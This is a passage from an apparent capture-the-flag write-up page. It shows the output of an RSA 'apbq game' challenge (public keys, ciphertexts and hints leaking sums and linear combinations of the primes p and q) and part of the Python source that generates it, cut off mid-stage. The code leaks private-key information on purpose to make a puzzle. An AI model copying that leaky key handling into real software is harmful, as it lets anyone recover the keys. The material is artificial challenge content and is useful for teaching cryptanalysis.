</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[+] Welcome to my apbq game
</span></span><span class=line><span class=cl>┃ stage 1: p + q
</span></span><span class=line><span class=cl>┃ hints = 18978581186415161964839647137704633944599150543420658500585655372831779670338724440572792208984183863860898382564328183868786589851370156024615630835636170
</span></span><span class=line><span class=cl>┃ public key = (89839084450618055007900277736741312641844770591346432583302975236097465068572445589385798822593889266430563039645335037061240101688433078717811590377686465973797658355984717210228739793741484666628342039127345855467748247485016133560729063901396973783754780048949709195334690395217112330585431653872523325589, 65537)
</span></span><span class=line><span class=cl>┃ enc1 = 23664702267463524872340419776983638860234156620934868573173546937679196743146691156369928738109129704387312263842088573122121751421709842579634121187349747424486233111885687289480494785285701709040663052248336541918235910988178207506008430080621354232140617853327942136965075461701008744432418773880574136247
</span></span><span class=line><span class=cl>----------------------
</span></span><span class=line><span class=cl>┃ stage 2: ai*p + bi*q
</span></span><span class=line><span class=cl>┃ hints = [18167664006612887319059224902765270796893002676833140278828762753019422055112981842474960489363321381703961075777458001649580900014422118323835566872616431879801196022002065870575408411392402196289546586784096, 16949724497872153018185454805056817009306460834363366674503445555601166063612534131218872220623085757598803471712484993846679917940676468400619280027766392891909311628455506176580754986432394780968152799110962, 17047826385266266053284093678595321710571075374778544212380847321745757838236659172906205102740667602435787521984776486971187349204170431714654733175622835939702945991530565925393793706654282009524471957119991, 25276634064427324410040718861523090738559926416024529567298785602258493027431468948039474136925591721164931318119534505838854361600391921633689344957912535216611716210525197658061038020595741600369400188538567, 22620929075309280405649238349357640303875210864208854217420509497788451366132889431240039164552611575528102978024292550959541449720371571757925105918051653777519219003404406299551822163574899163183356787743543, 20448555271367430173134759139565874060609709363893002188062221232670423900235907879442989619050874172750997684986786991784813276571714171675161047891339083833557999542955021257408958367084435326315450518847393, 16581432595661532600201978812720360650490725084571756108685801024225869509874266586101665454995626158761371202939602347462284734479523136008114543823450831433459621095011515966186441038409512845483898182330730, 23279853842002415904374433039119754653403309015190065311714877060259027498282160545851169991611095505190810819508498176947439317796919177899445232931519714386295909988604042659419915482267542524373950892662544, 16542280976863346138933938786694562410542429842169310231909671810291444369775133082891329676227328401108505520149711555594236523078258701726652736438397249153484528439336008442771240980575141952222517324476607, 17054798687400834881313828738161453727952686763495185341649729764826734928113560289710721893874591843482763545781022050238655346441049269145400183941816006501187555169759754496609909352066732267489240733143973, 22115728663051324710538517987151446287208882441569930705944807337542411196476967586630373946539021184108542887796299661200933395031919501574357288914028686562763621166172668808524981253976089963176915686295217, 19324745002425971121820837859939938858204545496254632010818159347041222757835937867307372949986924646040179923481350854019113237172710522847771842257888083088958980783122775860443475680302294211764812636993025, 17269103712436870749511150569030640471982622900104490728908671745662264368118790999669887094371008536628103283985205839448583011077421205589315164079023370873380480423797655480624151812894997816254147210406492, 17365467616785968410717969747207581822018195905573214322728668902230086291926193228235744513285718494565736538060677324971757810325341657627830082292794517994668597521842723473167615388674219621483061095351780, 20823988964903136690545608569993429386847299285019716840662662829134516039366335014168034963190410379384987535117127797097185441870894097973310130525700344822429616024795354496158261293140438037100429185280939, 19068742071797863698141529586788871165176403351706021832743114499444358327620104563127248492878047796963678668578417711317317649158855864613197342671267006688211460724339403654215571839421451060657330746917459, 20089639597210347757891251257684515181178224404350699015820324544431016085980542703447257134320668961280907495580251880177990935443438799776252979843969984270461013888122703933975001704404129130156833542263882, 22344734326131457204500487243249860924828673944521980798994250859372628295695660076289343998351448667548250129358262592043131205967592613289260998148991388190917863322690137458448696392344738292233285437662495, 22688858027824961235755458925538246922604928658660170686458395195714455094516952026243659139809095639584746977271909644938258445835519951859659822660413616465736923822988993362023001205350387354001389518742538, 21286046487289796335501643195437352334100195831127922478044197411293510360710188581314023052580692810484251118253550837525637065385439859631494533102244585493243972819369812352385425700028640641292410326514111, 21542729548465815605357067072323013570796657575603676418485975214641398139843537820643982914302122976789859817102498484496409546012119998359943274203338400776158986205776474024356567247508744784200354385060666, 22319592382753357951626314613193901130171847776829835028715915533809475362288873045184870972146269975570664009921662023590318988850871708674240304838922536028975978222603171333743353770676344328056539379240160, 25195209191944761648246874631038407055240893204894145709996399690807569652160721616011712739214434932639646688187304865397816188999592774874989401871300784534538762135830014255425391132306536883804201055992313, 18257804244956449160916107602212089869395886846990320452133193087611626919926796845263727422042179229606817439442521540784268169177331707314788427670112999551683927934427716554137597798283300120796277229509678, 20293403064916574136692432190836928681820834973375054705153628740577159076332283715581047503287766236543327123639746352358718218140738999496451259789097826888955418315455420948960832865750253988992454128969953, 15967654820584966012628708475666706277218484919923639492431538068059543232562431059752700377242326527417238151501168940191488179144049286512652111172149113549072003881460743035279388672984805823560897688895124, 25144187979876039024245879200325843092774389926620026124061775431569974232758799200333888039013494603721065709195353330350750055309315207499741437181094874894647736904055829877859906318073991986020178158776286, 15736932921640444103019961538951409924080453868073105830403926861058056351553271238438325117113945341892868641345117717666354739204401152657265824568724844930574396801692131746182948347887298330990039956813130, 18831072673439732764722762485733622234889447953507582396819704359771208236721692820362137219509611319088756045211407777880521726782697895768017460064889670066178710804124631128581556314122255564861269062385337, 23800437561684813552661749774840752013501533683948618798811470214669024646396165487093720960221009038817909066075238937189371227098032581450466402462014437421254375846263830927945343485988463525070074913720710, 24402191070622494792723290726249952159888270689258801831518209605331984684494095167423722682814769395395011136124403802097229547003802312444913008194461779426175966774202219703164060353710247619639616444797670, 20215481513831963554421686543560596857659844027486522940060791775984622049024173363533378455076109165728144576719015392033536498353094895564917644840994662704362121549525329105205514332808950206092190939931448, 18384453917605955747212560280232547481041600196031285084598132475801990710125754705645482436436531608696373462641765399622296314590071558616193035939108523357020287896879479452040171765916716377102454266933226, 21890401344164908103930010123434944359446535642544335610455613014563290097498740447164765588532234051104173227090428486681237432196639010849051113283297943367655458678533223039415083212229970648958070799280218, 18379893441293694747570620009241814202936873442370354246029979042247705730610190888710981918183390028386451290137755339890329474403224043675724851314770861939082447728194632548864823398818221526652331319263027, 18715827130228986951360013590464775001019026913384718876134449689773600060962392738619405370033085704046027397895627933844824630723286144367800484157574548819065406118338665931032779491897783504790669824301288, 13588739911708699123450670852772302012518315143187739886523841133752009403411431627334135210166268158490674049617489193734568451811305631563767138879895461211915128972052001136464325219117009268526575020143259, 18506039912943821193373920483847347155611306173368341979655092778147169768984477236224526786441466933360500418090210912574990962709452725122792963919616633389125605160796446674502416801964271004625701238202575, 22167985517547342184812919437069844889650448522260359154086923601900060998572245598167213217022051141570075284051615276464952346620430587694188548679895095556459804921016744713098882496174497693878187665372865, 21507363933875318987283059841465034113263466805329282129011688531718330888226928182985538861888698160675575993935166249701145994333840516459683763957425287811252135418288516497258724668090570720893589001392220, 20250321586608105267884665929443511322540360475552916143405651419034772061789298150974629817817611591100450468070842373341756704300393352252725859102426665187194754280129749402796746118608937061141768301995522, 16104259151024766025645778755951638093681273234415510444173981198301666343334808614748361662637508091511498829253677167171091582942780017355912433497214576425697459483727777273045993446283721290714044600814203, 14560242181138184594433372530956542527312169507277535425067427080573272033961044062335960097446781943943464713852520415535775461964590009720592053626735276833191667395201287169782350381649400286337671320581068, 16239347596615402699390026749150381714807445218767496868569282767673828662340774349530405347667558555781433774705139593469838946201218537641296949822639509296966092138954685186059819628696340121356660166937131, 21344472317634795288252811327141546596291633424850284492351783921599290478005814133560171828086405152298309169077585647189366292823613547973428250604674234857289341613448177246451956695700417432794886277704716, 16053809990112020217624905718566971288375815646771826941011489252522755953750669513046736360397030033178139614200701025268874379439106827823605937814395162011464610496629969260310816473733828751702925621950679, 18917855883623050190154989683327838135081813638430345099892537186954876489710857473326920009412778140451855952622686635694323466827034373114657023892484639238914593012175120540210780102536003758794571846502397, 22690171278715056779052233972642657173540399024770527983659216197108042021644328773010698851143953503599329885607621773816718008861742027388432534850163666629476315340137626681994316866368449548292328156728206, 21087818524872480052313215092436868441694786060866149491087132591272640372512484925209820065536439188250579925233059144898601140234767300574307770064543499923712729705795392684173268461519802573563186764326797, 18439753470094841291394543396785250736332596497190578058698960152415339036714664835925822942784700917586270640813663002161425694392259981974491535370706560550540525510875465091384383255081297963169390777475352, 20105719699015744146039374208926740159952318391171137544887868739518535254000803811729763681262304539724253518465850883904308979964535242371235415049403280585133993732946919550180260852767289669076362115454200, 17251599484976651171587511011045311555402088003441531674726612079301412643514474016351608797610153172169183504289799345382527665445027976807805594288914226822374523878290416047130731166794970645275146679838899, 23027331991437585896233907022469624030630702237261170259290872847355304456043379238362120518409085840638396736666056992747627271193089116095167049248270541979716594671069985183070290375121270398623215587207529, 18158149685496169798299129683009221264185608469410295069411669832919646968324946121757411511373498747604679198739125835462814352243797919744572086307939585501566092705355693015625009717017077302201663788208609, 18276153196656501517216055049560959047263892309902154534799806637704337317207294332426798932144785240877892837491213916540255237702169595754963908689566362060228840286531616263506272071630209104758589482803348, 19830654702835464289082520892939657653574451119898587213320188332842291005863699764597454403874285715252681820027919359194554863299385911740908952649966617784376852963552276558475217168696695867402522508290055, 15349828226638644963106414986240676364822261975534684137183044733508521003843559094515387144949811552173241406076270015291925943459603622043168219534080772937297911323165839870364550841685270125556125756627553, 20923687596111161976478930953796496927811701530608223491138786355445002217973253897724452954815797952200740069102515860924306246841340715110620719064010080520601890251137419840158983682372232110885549732743013, 21095748006022412831703352650023882351218414866517568822818298949510471554885207645049385966827210564667371665855668707424105040599599901165292360321667007968065708796593851653085339928947755081203265281357013, 20136320433636422315432754195821125224777716034031656342233368000257459497472596860252592531939146543685406198978058242599116859263546329669263543660114747385041549283367183026001454445297981439938401547228229, 16496919752274418275948572022974868132658743151124597724312835413857298109100258912203517423633396955060591787380445877361136405137884456764770035346437177846666365911942996404514058688909577420388537479730705, 13788728438272498164727737074811797093818033799836159894472736480763530670013682288670889124484670336660448907074673625466218166413315342420667608074179975422284472184048790475129281850298519112884101776426380, 24852871485448795332267345793743281093931161235481251209948049584749441451621572752080662697610253315331335180611651946374137068256112152253681972406000252076016099200912670370417045090034045383991812756120791, 18663346319122078996775762643035864683521213720864038756854558668694021987970601131985163948257100423991091156649638455828855082098689641225427227191064496066436196910238564311309556938903101074363279783438714, 21400068681031931459396470039651524575262457489792894764406364952394476440804779651233022862527636114968325782197380721095406628084183336358459476006267416033892771932528688312375109463803215034905281657962293, 16044158155847172030103761204572942507195578382208455423846603003318483484698088948486132040995746837257705704187725306831142305215342467016564452582165866039427184607605673304595194959499145031211096109534167, 16518253246325822837502418827700493807621067058438396395472266350036385535241769917459657069911028720968654253735107131282350340465691670072304718987805883113410923109703284511709226857412404454224134480632696, 22032469066601123287586507039704080058983969235246539501189720236880312024198451198788699002335010120658564926677243708367430773661097221076615953342733896063909953602379936312639192315223258556134958059637605, 17474611942177808070315948910226643697957069578572244709354155010512694059987765040746148981545760660371360975936526076852619987733316042847813177383519241505024635332293992920023420060610648140841369822739716, 20097265939024591617239874622716452182434300498447992668997438018575636772416262543204370899462096267444545094719202447520254303983442269757551626971917981420832391886214473318353984504467919530676605744560570, 18170251482705061226968041449812078923477452841162650888922564215790088545936753453513162197661916172215859504545409274440450807677845894292177296835154674774694992388033874349807244020099167681146357128785394, 18084007437523118129421476751918491055914528331902780911288404344016551650138679157754567938593688369062981279371320169939281882307797009116458871503759873023914718337944953764426183937635379280572434676575757, 17001811604221128900675671565539617923973183364469396458234914432162200119518252971721448274846235879320362924206656971472493711107677598961463553324277826426691784458674010708635756004550789902368338633272118, 20217009574515126619724139485885721324936960849401637840860565569588595992087537454744066905387396266844236387315004915383456736142307523960394594650088663019228826091309049211780607761862663242437656610298243, 25534440916970201550118006203706860249111087748000550226680885431006136131742280963090650607632467666558508520152535105122661615376298673454198064361094319699307084117001019115669670029195171047304283891069792, 18871869316294018605789169171879572816494092699556970507058691345095743053290043643010965660058888064972257990750611470141816041727746767146945121588515830427165739580791663951175220638901672353681640741068573, 20173968537913641339915058056878181363456579537994317562789857397928196160113042659777558550242315788417022891612723148843142958668959046890197219991727894451795438138592005695329607326086644956073759609743066, 20601943394990265144021144365970164017319737300436518536503270346147112565303361487668388700369636611354280332841812324530501569200031186584749278453651172121161814207025650519637781007286435981682228528706305, 16397528630087028144645213166977866073543422560337716097539091258081008408890966764995645782823950721804205427713461441138000880478364026137452291234097219085473748076681729365744710225699866258812642458184750, 21373350333568141000876969785296802670776508778278005158047105058430550665787088265486222905402690421155861103648370249249790560185790723042867282734693553039477436055775198037042047438047898227097749354619822, 17767469767416052322357795736899648760868316512079849340028040817353808899589201201338152114229279980849491049574543361275046276135253417685681262008211582060955974064559129311524323185960856955462761555353091, 22148352529815091269441663541923247974004854058764556809596705832663604786920964849725772666340437231503146814919702525852955831173047034475925578238466977606367380212886384487294569287202762127531620290162734, 21663842528026621741414050256553652815372885707031383713657826718944735177083300302064509342116651731671570591336596953911570477161536730982887182434407761036442993588590230296643001682944654490645815177777455, 20219077358929317461660881724990436334639078047412693497584358963241840513748365548465302817975329987854784305275832045889690022909383530837382543579292451297269623663257098458645056099201050578472103957851128, 18255302182526662903763852563401346841065939531070045000414364747445988455597258924280193695407035356029557886165605853810182770534711966292253269625917149411889979307227493949293798772727125069093642134972336, 24926064145128749429079117171467042019887257504329103038171762786986349157515552927216574990423327013202735544601170247730647598931030432792167867343343213411600516855009788294067588153504026267213013591793027, 22369607314724468760253123915374991621544992437057652340350735935680183705467064876346663859696919167243522648029531700630202188671406298533187087292461774927340821192866797400987231509211718089237481902671100, 16994227117141934754898145294760231694287000959561775153135582047697469327393472840046006353260694322888486978811557952926229613247229990658445756595259401269267528233642142950389040647504583683489067768144570, 21758885458682118428357134100118546351270408335845311063139309657532131159530485845186953650675925931634290182806173575543561250369768935902929861898597396621656214490429009706989779345367262758413050071213624, 20156282616031755826700336845313823798147854495428660743884481573484471099887576514309769978525225369254700468742981099548840277532978306665910844928986235042420698332201264764734685502001234369189521332392642, 23291765247744127414491614915358658114280269483384022733002965612273627987872443453777028006606037159079637857473229879140366385523633075816362547967658930666106914269093225208138749470566410361196451552322613, 19807792217079652175713365065361659318870738952921195173619551645956745050506271953949139230097128034416815169649874760890189515620232505703162831090225715453502422905418824316957257395992121750661389503495033, 22074209373194902539215367382758486068533032275912313703269990627206774967653336496619231924013216321042649461711292555464574124714934511202231319963361912937842068483700298097209400217869036338644607607557860, 19678336511265998427322297909733474384702243426420286924671444552444079816707773485084891630780465895504253899943221044355971296122774264925882685351095921532685536165514189427245840338009573352081361238596378, 24746314790210393213546150322117518542380438001687269872679602687597595933350510598742749840102841364627647151669428936678130556027300886850086220074563664367409218038338623691372433831784916816798993162471163, 19346137206512895254202370018555139713690272833895195472766704715282164091959131850520571672509601848193468792313437642997923790118115476212663296111963644011010744006086847599108492279986468255445160241848708, 22739514514055088545643169404630736699361136323546717268615404574809011342622362833245601099992039789664042350284789853188040159950619203242924511038681127008964592137006103547262538912024671048254652547084347, 21491512279698208400974501713300096639215882495977078132548631606796810881149011161903684894826752520167909538856354238104288201344211604223297924253960199754326239113862002469224042442018978623149685130901455, 19381008151938129775129563507607725859173925946797075261437001349051037306091047611533900186593946739906685481456985573476863123716331923469386565432105662324849798182175616351721533048174745501978394238803081, 19965143096260141101824772370858657624912960190922708879345774507598595008331705725441057080530773097285721556537121282837594544143441953208783728710383586054502176671726097169651121269564738513585870857829805]
</span></span><span class=line><span class=cl>┃ public key = (73566307488763122580179867626252642940955298748752818919017828624963832700766915409125057515624347299603944790342215380220728964393071261454143348878369192979087090394858108255421841966688982884778999786076287493231499536762158941790933738200959195185310223268630105090119593363464568858268074382723204344819, 65537)
</span></span><span class=line><span class=cl>┃ enc2 = 30332590230153809507216298771130058954523332140754441956121305005101434036857592445870499808003492282406658682811671092885592290410570348283122359319554197485624784590315564056341976355615543224373344781813890901916269854242660708815123152440620383035798542275833361820196294814385622613621016771854846491244
</span></span><span class=line><span class=cl>----------------------
</span></span><span class=line><span class=cl>┃ stage 3: a*p + q, p + bq
</span></span><span class=line><span class=cl>┃ hints = (68510878638370415044742935889020774276546916983689799210290582093686515377232591362560941306242501220803210859757512468762736941602749345887425082831572206675493389611203432014126644550502117937044804472954180498370676609819898980996282130652627551615825721459553747074503843556784456297882411861526590080037, 117882651978564762717266768251008799169262849451887398128580060795377656792158234083843539818050019451797822782621312362313232759168181582387488893534974006037142066091872636582259199644094998729866484138566711846974126209431468102938252566414322631620261045488855395390985797791782549179665864885691057222752)
</span></span><span class=line><span class=cl>┃ public key = (94789409892878223843496496113047481402435455468813255092840207010463661854593919772268992045955100688692872116996741724352837555794276141314552518390800907711192442516993891316013640874154318671978150702691578926912235318405120588096104222702992868492960182477857526176600665556671704106974346372234964363581, 65537)
</span></span><span class=line><span class=cl>┃ enc3 = 17737974772490835017139672507261082238806983528533357501033270577311227414618940490226102450232473366793815933753927943027643033829459416623683596533955075569578787574561297243060958714055785089716571943663350360324047532058597960949979894090400134473940587235634842078030727691627400903239810993936770281755
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>secrets</span> <span class=kn>import</span> <span class=n>flag</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>math</span> <span class=kn>import</span> <span class=n>ceil</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>RSA</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>privatekey</span><span class=p>,</span> <span class=n>publickey</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>p</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>q</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>d</span> <span class=o>=</span> <span class=n>privatekey</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>n</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>e</span> <span class=o>=</span> <span class=n>publickey</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>encrypt</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>plaintext</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>isinstance</span><span class=p>(</span><span class=n>plaintext</span><span class=p>,</span> <span class=nb>bytes</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>plaintext</span> <span class=o>=</span> <span class=n>bytes_to_long</span><span class=p>(</span><span class=n>plaintext</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>ciphertext</span> <span class=o>=</span> <span class=nb>pow</span><span class=p>(</span><span class=n>plaintext</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>e</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>ciphertext</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>decrypt</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>ciphertext</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>isinstance</span><span class=p>(</span><span class=n>ciphertext</span><span class=p>,</span> <span class=nb>bytes</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>ciphertext</span> <span class=o>=</span> <span class=n>bytes_to_long</span><span class=p>(</span><span class=n>ciphertext</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>plaintext</span> <span class=o>=</span> <span class=nb>pow</span><span class=p>(</span><span class=n>ciphertext</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>d</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>plaintext</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_keypair</span><span class=p>(</span><span class=n>nbits</span><span class=p>,</span> <span class=n>e</span> <span class=o>=</span> <span class=mi>65537</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span> <span class=o>=</span> <span class=n>getPrime</span><span class=p>(</span><span class=n>nbits</span><span class=o>//</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>q</span> <span class=o>=</span> <span class=n>getPrime</span><span class=p>(</span><span class=n>nbits</span><span class=o>//</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>n</span> <span class=o>=</span> <span class=n>p</span> <span class=o>*</span> <span class=n>q</span>
</span></span><span class=line><span class=cl>    <span class=n>d</span> <span class=o>=</span> <span class=n>inverse</span><span class=p>(</span><span class=n>e</span><span class=p>,</span> <span class=n>n</span> <span class=o>-</span> <span class=n>p</span> <span class=o>-</span> <span class=n>q</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=n>p</span><span class=p>,</span> <span class=n>q</span><span class=p>,</span> <span class=n>d</span><span class=p>),</span> <span class=p>(</span><span class=n>n</span><span class=p>,</span> <span class=n>e</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>pt</span> <span class=o>=</span> <span class=s1>&#39;./output.txt&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>fout</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=n>pt</span><span class=p>,</span> <span class=s1>&#39;w&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sys</span><span class=o>.</span><span class=n>stdout</span> <span class=o>=</span> <span class=n>fout</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>block_size</span> <span class=o>=</span> <span class=n>ceil</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span><span class=o>/</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>flag</span> <span class=o>=</span> <span class=p>[</span><span class=n>flag</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=n>block_size</span><span class=p>]</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>flag</span><span class=p>),</span> <span class=n>block_size</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>    <span class=n>e</span> <span class=o>=</span> <span class=mi>65537</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;[+] Welcome to my apbq game&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># stage 1</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;┃ stage 1: p + q&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>prikey1</span><span class=p>,</span> <span class=n>pubkey1</span> <span class=o>=</span> <span class=n>get_keypair</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>RSA1</span> <span class=o>=</span> <span class=n>RSA</span><span class=p>(</span><span class=n>prikey1</span><span class=p>,</span> <span class=n>pubkey1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>enc1</span> <span class=o>=</span> <span class=n>RSA1</span><span class=o>.</span><span class=n>encrypt</span><span class=p>(</span><span class=n>flag</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;┃ hints = </span><span class=si>{</span><span class=n>prikey1</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>+</span> <span class=n>prikey1</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;┃ public key = </span><span class=si>{</span><span class=n>pubkey1</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;┃ enc1 = </span><span class=si>{</span><span class=n>enc1</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;----------------------&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># stage 2</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;┃ stage 2: ai*p + bi*q&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>prikey2</span><span class=p>,</span> <span class=n>pubkey2</span> <span class=o>=</span> <span class=n>get_keypair</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>RSA2</span> <span class=o>=</span> <span class=n>RSA</span><span class=p>(</span><span class=n>prikey2</span><span class=p>,</span> <span class=n>pubkey2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>enc2</span> <span class=o>=</span> <span class=n>RSA2</span><span class=o>.</span><span class=n>encrypt</span><span class=p>(</span><span class=n>flag</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=n>kbits</span> <span class=o>=</span> <span class=mi>180</span>
</span></span><span class=line><span class=cl>    <span class=n>a</span> <span class=o>=</span> <span class=p>[</span><span class=n>getRandomNBitInteger</span><span class=p>(</span><span class=n>kbits</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>100</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>    <span class=n>b</span> <span class=o>=</span> <span class=p>[</span><span class=n>getRandomNBitInteger</span><span class=p>(</span><span class=n>kbits</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>100</span><span class=p>)]</span>
